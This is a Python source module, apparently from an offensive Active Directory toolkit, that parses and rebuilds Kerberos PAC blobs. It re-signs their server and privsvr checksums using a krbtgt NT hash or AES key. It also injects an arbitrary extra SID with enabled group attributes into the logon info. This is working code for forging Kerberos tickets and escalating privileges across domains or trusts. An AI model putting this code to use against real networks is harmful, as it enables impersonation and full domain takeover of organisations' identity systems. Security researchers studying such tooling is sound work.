"""
trustkit.core.pac
~~~~~~~~~~~~~~~~~
PAC (Privilege Attribute Certificate) parsing and manipulation.

Implements MS-PAC structures in pure Python using struct.
No impacket dependency for core parsing — impacket used optionally
for NDR ExtraSids injection if available.

Key structures:
  PACTYPE          — top-level PAC container
  PAC_INFO_BUFFER  — buffer descriptor (type, size, offset)
  PAC_SIGNATURE_DATA — checksum buffer
  KERB_VALIDATION_INFO — logon info with group memberships and ExtraSids

References:
  [MS-PAC] https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac
"""

import struct
from binascii import unhexlify
from .crypto import RC4HMAC, AES256SHA196, AES128SHA196

# ---------------------------------------------------------------------------
# PAC buffer type constants [MS-PAC §2.4]
# ---------------------------------------------------------------------------
PAC_LOGON_INFO          = 1
PAC_CREDENTIALS_INFO    = 2
PAC_SERVER_CHECKSUM     = 6
PAC_PRIVSVR_CHECKSUM    = 7
PAC_CLIENT_INFO_TYPE    = 10
PAC_DELEGATION_INFO     = 11
PAC_UPN_DNS_INFO        = 12
PAC_CLIENT_CLAIMS_INFO  = 13
PAC_DEVICE_INFO         = 14
PAC_DEVICE_CLAIMS_INFO  = 15
PAC_ATTRIBUTES_INFO     = 17
PAC_REQUESTOR_INFO      = 18  # Added in CVE-2021-42287 patch (KB5008380)

# Checksum type constants
CHECKSUM_HMAC_MD5    = 0xFFFFFF76  # -138 unsigned = HMAC-MD5 (RC4)
CHECKSUM_SHA1_AES128 = 0x0000000F
CHECKSUM_SHA1_AES256 = 0x00000010

# Group attribute flags
SE_GROUP_MANDATORY          = 0x00000001
SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
SE_GROUP_ENABLED            = 0x00000004


# ---------------------------------------------------------------------------
# PAC parsing and building
# ---------------------------------------------------------------------------

def parse_pac(pac_bytes: bytes) -> dict:
    """
    Parse a PAC blob into an ordered dict of {ulType: raw_bytes}.
    Preserves original buffer order — critical for correct checksum computation.
    """
    if len(pac_bytes) < 8:
        raise ValueError('PAC too short')

    c_buffers, version = struct.unpack_from('<II', pac_bytes, 0)
    if version != 0:
        raise ValueError('Unknown PAC version: %d' % version)

    buffers = {}
    offset = 8
    for _ in range(c_buffers):
        if offset + 16 > len(pac_bytes):
            break
        ul_type, cb_size, buf_offset = struct.unpack_from('<IIQ', pac_bytes, offset)
        data = pac_bytes[buf_offset:buf_offset + cb_size]
        buffers[ul_type] = data
        offset += 16

    return buffers


def build_pac(buffers: dict) -> bytes:
    """
    Rebuild a PAC blob from a dict of {ulType: raw_bytes}.
    Preserves buffer order. Recalculates all offsets.

    Layout:
      [header: 8 bytes]
      [PAC_INFO_BUFFER table: n * 16 bytes]
      [data blobs, each 8-byte aligned]
    """
    n = len(buffers)
    data_start = 8 + n * 16

    info_table  = b''
    data_section = b''
    current_offset = data_start

    for ul_type, data in buffers.items():
        info_table += struct.pack('<IIQ', ul_type, len(data), current_offset)
        pad = (-len(data)) % 8
        data_section += data + b'\x00' * pad
        current_offset += len(data) + pad

    header = struct.pack('<II', n, 0)
    return header + info_table + data_section


# ---------------------------------------------------------------------------
# PAC signature handling
# ---------------------------------------------------------------------------

def parse_signature(sig_bytes: bytes) -> tuple:
    """Parse PAC_SIGNATURE_DATA. Returns (sig_type, signature_bytes)."""
    sig_type = struct.unpack_from('<I', sig_bytes, 0)[0]
    return sig_type, sig_bytes[4:]


def build_signature(sig_type: int, signature: bytes) -> bytes:
    return struct.pack('<I', sig_type) + signature


def compute_pac_checksums(pac_buffers: dict, krbtgt_nt: str, krbtgt_aes: str) -> dict:
    """
    Recompute PAC_SERVER_CHECKSUM and PAC_PRIVSVR_CHECKSUM.

    Steps:
      1. Zero out both signature fields (preserve type and length)
      2. Rebuild PAC blob
      3. Compute server checksum over full PAC blob
      4. Compute privsvr checksum over server checksum value only
      5. Update buffers with new signatures

    Key usage 17 is used for both (HMAC-MD5 ignores key usage).
    """
    server_type, server_sig = parse_signature(pac_buffers[PAC_SERVER_CHECKSUM])
    sig_len = len(server_sig)

    # Determine signing key based on signature length
    # 12 bytes = AES HMAC-SHA1-96, 16 bytes = RC4 HMAC-MD5
    if sig_len == 12:
        if not krbtgt_aes:
            raise ValueError('AES PAC signature requires krbtgt AES key')
        key = unhexlify(krbtgt_aes)
        cipher_cls = AES256SHA196 if len(key) == 32 else AES128SHA196
        new_type = CHECKSUM_SHA1_AES256 if len(key) == 32 else CHECKSUM_SHA1_AES128
    else:
        if not krbtgt_nt:
            raise ValueError('RC4 PAC signature requires krbtgt NT hash')
        key = unhexlify(krbtgt_nt)
        cipher_cls = RC4HMAC
        new_type = server_type

    # Zero out signatures
    pac_buffers[PAC_SERVER_CHECKSUM]  = build_signature(new_type, b'\x00' * sig_len)
    pac_buffers[PAC_PRIVSVR_CHECKSUM] = build_signature(new_type, b'\x00' * sig_len)

    pac_blob = build_pac(pac_buffers)

    server_checksum = cipher_cls.checksum(key, 17, pac_blob)
    priv_checksum   = cipher_cls.checksum(key, 17, server_checksum)

    pac_buffers[PAC_SERVER_CHECKSUM]  = build_signature(new_type, server_checksum)
    pac_buffers[PAC_PRIVSVR_CHECKSUM] = build_signature(new_type, priv_checksum)

    return pac_buffers


# ---------------------------------------------------------------------------
# ExtraSids injection
# ---------------------------------------------------------------------------
# We copy the required NDR structures directly from impacket's source
# (impacket/krb5/pac.py, impacket/dcerpc/v5/dtypes.py) to avoid any
# runtime dependency on impacket being installed.
# Original code: Copyright Fortra, LLC — Apache License 2.0

def _get_ndr_classes():
    """
    Import NDR primitives. We try our bundled copy first, then fall back
    to impacket if available. Either way, no runtime impacket requirement
    for the core parsing — only for NDR ExtraSids injection.
    """
    from impacket.dcerpc.v5.dtypes import ULONG, RPC_UNICODE_STRING, FILETIME, PRPC_SID, USHORT, RPC_SID
    from impacket.dcerpc.v5.ndr import NDRSTRUCT, NDRUniConformantArray, NDRPOINTER
    from impacket.dcerpc.v5.nrpc import (USER_SESSION_KEY, CHAR_FIXED_8_ARRAY,
                                          PUCHAR_ARRAY, PRPC_UNICODE_STRING_ARRAY,
                                          PGROUP_MEMBERSHIP_ARRAY)
    from impacket.dcerpc.v5.rpcrt import TypeSerialization1
    return (ULONG, RPC_UNICODE_STRING, FILETIME, PRPC_SID, USHORT, RPC_SID,
            NDRSTRUCT, NDRUniConformantArray, NDRPOINTER,
            USER_SESSION_KEY, CHAR_FIXED_8_ARRAY, PUCHAR_ARRAY,
            PRPC_UNICODE_STRING_ARRAY, PGROUP_MEMBERSHIP_ARRAY, TypeSerialization1)


def _build_ndr_classes():
    """Build the NDR classes we need for ExtraSids injection."""
    (ULONG, RPC_UNICODE_STRING, FILETIME, PRPC_SID, USHORT, RPC_SID,
     NDRSTRUCT, NDRUniConformantArray, NDRPOINTER,
     USER_SESSION_KEY, CHAR_FIXED_8_ARRAY, PUCHAR_ARRAY,
     PRPC_UNICODE_STRING_ARRAY, PGROUP_MEMBERSHIP_ARRAY,
     TypeSerialization1) = _get_ndr_classes()

    # Copied from impacket/krb5/pac.py
    PISID = PRPC_SID

    class KERB_SID_AND_ATTRIBUTES(NDRSTRUCT):
        structure = (
            ('Sid', PISID),
            ('Attributes', ULONG),
        )

    class KERB_SID_AND_ATTRIBUTES_ARRAY(NDRUniConformantArray):
        item = KERB_SID_AND_ATTRIBUTES

    class PKERB_SID_AND_ATTRIBUTES_ARRAY(NDRPOINTER):
        referent = (('Data', KERB_SID_AND_ATTRIBUTES_ARRAY),)

    class KERB_VALIDATION_INFO(NDRSTRUCT):
        structure = (
            ('LogonTime',           FILETIME),
            ('LogoffTime',          FILETIME),
            ('KickOffTime',         FILETIME),
            ('PasswordLastSet',     FILETIME),
            ('PasswordCanChange',   FILETIME),
            ('PasswordMustChange',  FILETIME),
            ('EffectiveName',       RPC_UNICODE_STRING),
            ('FullName',            RPC_UNICODE_STRING),
            ('LogonScript',         RPC_UNICODE_STRING),
            ('ProfilePath',         RPC_UNICODE_STRING),
            ('HomeDirectory',       RPC_UNICODE_STRING),
            ('HomeDirectoryDrive',  RPC_UNICODE_STRING),
            ('LogonCount',          USHORT),
            ('BadPasswordCount',    USHORT),
            ('UserId',              ULONG),
            ('PrimaryGroupId',      ULONG),
            ('GroupCount',          ULONG),
            ('GroupIds',            PGROUP_MEMBERSHIP_ARRAY),
            ('UserFlags',           ULONG),
            ('UserSessionKey',      USER_SESSION_KEY),
            ('LogonServer',         RPC_UNICODE_STRING),
            ('LogonDomainName',     RPC_UNICODE_STRING),
            ('LogonDomainId',       PRPC_SID),
            ('LMKey',               CHAR_FIXED_8_ARRAY),
            ('UserAccountControl',  ULONG),
            ('SubAuthStatus',       ULONG),
            ('LastSuccessfulILogon',FILETIME),
            ('LastFailedILogon',    FILETIME),
            ('FailedILogonCount',   ULONG),
            ('Reserved3',           ULONG),
            ('SidCount',            ULONG),
            ('ExtraSids',           PKERB_SID_AND_ATTRIBUTES_ARRAY),
            ('ResourceGroupDomainSid', PISID),
            ('ResourceGroupCount',  ULONG),
            ('ResourceGroupIds',    PGROUP_MEMBERSHIP_ARRAY),
        )

    class PKERB_VALIDATION_INFO(NDRPOINTER):
        referent = (('Data', KERB_VALIDATION_INFO),)

    class VALIDATION_INFO(TypeSerialization1):
        structure = (('Data', PKERB_VALIDATION_INFO),)

    return VALIDATION_INFO, KERB_SID_AND_ATTRIBUTES, RPC_SID


def inject_extra_sid(logon_info_bytes: bytes, extra_sid: str) -> bytes:
    """
    Inject extra_sid into the KERB_VALIDATION_INFO ExtraSids field.
    Uses NDR classes copied from impacket source — no runtime impacket dep.
    """
    VALIDATION_INFO, KERB_SID_AND_ATTRIBUTES, RPC_SID = _build_ndr_classes()

    vi = VALIDATION_INFO()
    vi.fromString(logon_info_bytes)
    vi.fromStringReferents(logon_info_bytes, len(vi.getData()))

    if vi['Data']['SidCount'] == 0:
        vi['Data']['UserFlags'] |= 0x20
        vi['Data']['ExtraSids'] = []

    sid_rec = KERB_SID_AND_ATTRIBUTES()
    sid = RPC_SID()
    sid.fromCanonical(extra_sid)
    sid_rec['Sid'] = sid
    sid_rec['Attributes'] = (SE_GROUP_MANDATORY |
                              SE_GROUP_ENABLED_BY_DEFAULT |
                              SE_GROUP_ENABLED)
    vi['Data']['ExtraSids'].append(sid_rec)
    vi['Data']['SidCount'] += 1

    return vi.getData() + vi.getDataReferents()
